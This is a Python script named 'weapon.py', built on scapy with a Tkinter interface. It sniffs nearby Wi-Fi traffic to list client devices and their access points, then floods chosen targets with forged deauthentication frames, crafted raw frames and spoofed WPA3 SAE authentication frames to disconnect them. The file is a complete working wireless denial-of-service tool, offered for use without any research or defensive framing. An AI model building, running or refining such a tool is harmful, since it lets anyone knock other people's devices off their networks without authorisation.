import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalWeaponV6_5:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {} 
        self.active_attacks = set()
        self.running = True
        self.current_ch = 1
        
        self.setup_monitor_mode()
        
        self.root = tk.Tk()
        self.root.title("Surgical Logic v6.5 - Debug Mode")
        self.root.geometry("900x650")
        self.root.configure(bg="#050505")

        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=22)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="SURGICAL KICK", command=lambda: self.start_attack("SMART"), bg="#aa5500", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="SAE RESET", command=lambda: self.start_attack("SAE"), bg="#880000", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="EXIT & REPAIR", command=self.shutdown, bg="#222", fg="#ff0000", width=15).pack(side="left", padx=5)

        self.status = tk.Label(self.root, text="System Live - Check Terminal for Debug", bg="#050505", fg="#00FF41")
        self.status.pack()

        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.smart_scanner, daemon=True).start()
        threading.Thread(target=self.attack_logic_loop, daemon=True).start()

    def setup_monitor_mode(self):
        print(f"[DEBUG] Initializing hardware on {self.iface}...")
        os.system("sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")
        print(f"[DEBUG] Monitor mode active.")

    def hopper(self):
        while self.running:
            for ch in range(1, 14):
                if not self.active_attacks and self.running:
                    os.system(f"sudo iw dev {self.iface} set channel {ch}")
                    self.current_ch = ch
                    # print(f"[DEBUG] Hopping to Channel {ch}") # Uncomment if you want to see every hop
                    time.sleep(0.5)
                elif not self.running: break
                else: 
                    time.sleep(1)

    def smart_scanner(self):
        def callback(pkt):
            if not pkt.haslayer(Dot11) or not self.running:
                return

            rssi = -100 
            if pkt.haslayer(RadioTap):
                try:
                    sig = getattr(pkt, 'dBm_AntSignal', None)
                    if sig is not None:
                        rssi = int(sig)
                except:
                    pass 

            if rssi < -80: return 

            dot11 = pkt.getlayer(Dot11)
            if dot11.addr2 and dot11.addr3 and dot11.addr2 != dot11.addr3:
                client, bssid = dot11.addr2, dot11.addr3
                if client not in self.discovered and client != "ff:ff:ff:ff:ff:ff":
                    conn_type = "WPA3" if (pkt.haslayer(Dot11Auth) and pkt.algo == 3) else "DATA"
                    self.discovered[client] = {"BSSID": bssid, "RSSI": rssi, "Type": conn_type, "CH": self.current_ch}
                    print(f"[FOUND] {client} on CH {self.current_ch} ({rssi}dBm) - Type: {conn_type}")
                    self.root.after(0, self.refresh_ui)

        sniff(iface=self.iface, prn=callback, store=0)

    def attack_logic_loop(self):
        while self.running:
            targets = list(self.active_attacks)
            for client, mode in targets:
                try:
                    data = self.discovered.get(client)
                    if not data: continue
                    b = data["BSSID"]
                    ch = data["CH"]
                    
                    # Debug: Confirm card is on the right channel
                    print(f"[ATTACK] Firing {mode} at {client} (AP: {b}) on Channel {ch}")
                    
                    base = RadioTap()/Dot11(addr1=b, addr2=client, addr3=b)
                    
                    if mode == "SAE":
                        pkt = base/Dot11Auth(algo=3, seqnum=1, status=0)
                        sendp(pkt, iface=self.iface, verbose=False, count=5)
                    else: 
                        ocv = base/Raw(load=b"\x0a\x04\xff\x0a\x01\x01")
                        deauth = base/Dot11Deauth(reason=7)
                        sendp([ocv, deauth], iface=self.iface, verbose=False, count=2)
                except Exception as e:
                    print(f"[ERROR] Attack loop failure: {e}")
            time.sleep(0.3)

    def start_attack(self, mode):
        for i in self.listbox.curselection():
            mac = list(self.discovered.keys())[i]
            target_data = self.discovered[mac]
            # Logic: Force channel lock before starting attack
            print(f"[LOCK] Locking card to Channel {target_data['CH']} for {mac}")
            os.system(f"sudo iw dev {self.iface} set channel {target_data['CH']}")
            self.active_attacks.add((mac, mode))
        self.refresh_ui()

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.discovered.items():
            is_hit = any(mac == m for m, mode in self.active_attacks)
            prefix = " [!] " if is_hit else f" [{info['RSSI']}dBm] "
            self.listbox.insert(tk.END, f"{prefix} {mac} | CH: {info['CH']} | {info['Type']}")

    def shutdown(self):
        print("\n[CLEANUP] Closing engines and repairing network...")
        self.running = False
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type managed")
        os.system(f"sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        print("[SUCCESS] Managed mode restored. Exit.")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
    else: SurgicalWeaponV6_5(sys.argv[1]).root.mainloop()
